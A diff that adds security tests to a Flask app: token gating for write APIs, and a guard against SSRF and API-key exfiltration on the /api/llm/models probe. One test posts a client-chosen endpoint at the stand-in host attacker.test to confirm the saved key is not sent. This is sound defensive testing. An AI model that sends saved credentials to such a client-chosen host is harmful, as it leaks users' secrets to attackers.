@@ -10,6 +10,54 @@ def test_health(client):
     assert r.status_code == 200 and r.get_json()['status'] == 'ok'
 
 
+def test_api_write_requires_token(client):
+    """SECURITY: state-changing /api/* calls without the session token are 403;
+    read GETs and token-bearing calls are allowed."""
+    import app as app_module
+    # No token → forbidden (override the fixture's default token header).
+    r = client.post('/api/prefs', json={'kind': 'pdf', 'prefs': {}},
+                    headers={'X-YR-Token': ''})
+    assert r.status_code == 403
+    # Wrong token → forbidden.
+    r = client.post('/api/prefs', json={'kind': 'pdf', 'prefs': {}},
+                    headers={'X-YR-Token': 'nope'})
+    assert r.status_code == 403
+    # Correct token → allowed.
+    r = client.post('/api/prefs', json={'kind': 'pdf', 'prefs': {}},
+                    headers={'X-YR-Token': app_module._API_TOKEN})
+    assert r.status_code == 200
+    # Read-only GET is not token-gated (so <img> renders keep working).
+    assert client.get('/health').status_code == 200
+
+
+def test_llm_probe_never_leaks_saved_api_key(client, monkeypatch):
+    """SECURITY: /api/llm/models must NOT send the SAVED api_key to a
+    client-chosen endpoint (SSRF + key-exfil guard)."""
+    import app as app_module
+    from renderers import llm
+    app_module.userdata.set_setting('ai', {
+        'backend': 'custom',
+        'endpoint': 'https://api.openai.com/v1/chat/completions',
+        'model': 'gpt', 'api_key': 'sk-SECRET-SAVED-KEY',
+    })
+
+    captured = {}
+
+    def fake_get(url, headers=None, timeout=None):
+        captured['url'] = url
+        captured['headers'] = headers or {}
+        raise llm.requests.RequestException('blocked in test')
+
+    monkeypatch.setattr(llm.requests, 'get', fake_get)
+    # Attacker overrides only the endpoint, supplying NO key of their own.
+    r = client.post('/api/llm/models', json={'ai': {'endpoint': 'http://attacker.test/v1/chat/completions'}})
+    assert r.status_code == 200            # endpoint handles the (mocked) failure gracefully
+    assert captured.get('url', '').startswith('http://attacker.test')   # request did go to the chosen endpoint
+    auth = captured.get('headers', {}).get('Authorization', '')
+    assert 'sk-SECRET-SAVED-KEY' not in auth   # but the SAVED key was NOT attached
+    assert auth == '' or 'Authorization' not in captured['headers']
+
+
 def test_open_and_page_render(client, samples):
     r = client.post('/api/open', json={'path': str(samples['pdf'])})
     assert r.status_code == 200
